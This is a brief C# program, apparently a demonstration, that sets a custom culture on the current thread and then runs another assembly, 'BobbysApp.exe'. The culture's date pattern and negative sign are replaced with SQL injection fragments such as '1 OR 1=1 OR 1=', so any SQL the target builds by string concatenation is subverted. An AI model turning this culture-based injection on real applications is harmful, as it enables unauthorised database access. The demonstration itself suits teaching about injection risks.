    using System;
    using System.Globalization;
    using System.Reflection;
    using System.Threading;
    namespace ConsoleApplication2
    {
      class Program
      {
        static void Main(string[] args)
        {
          Assembly asm = Assembly.LoadFile(@"C:\BobbysApp.exe");
          MethodInfo mi = asm.GetType("Test").GetMethod("Main");
          mi.Invoke(null, null);
          Console.ReadLine();
        }
        static Program()
        {
          InstallBobbyTablesCulture();
        }
        static void InstallBobbyTablesCulture()
        {
          CultureInfo bobby = (CultureInfo)CultureInfo.InvariantCulture.Clone();
          bobby.DateTimeFormat.ShortDatePattern = @"yyyy-MM-dd'' OR ' '=''";
          bobby.DateTimeFormat.LongTimePattern = "";
          bobby.NumberFormat.NegativeSign = "1 OR 1=1 OR 1=";
          Thread.CurrentThread.CurrentCulture = bobby;
        }
      }
    }
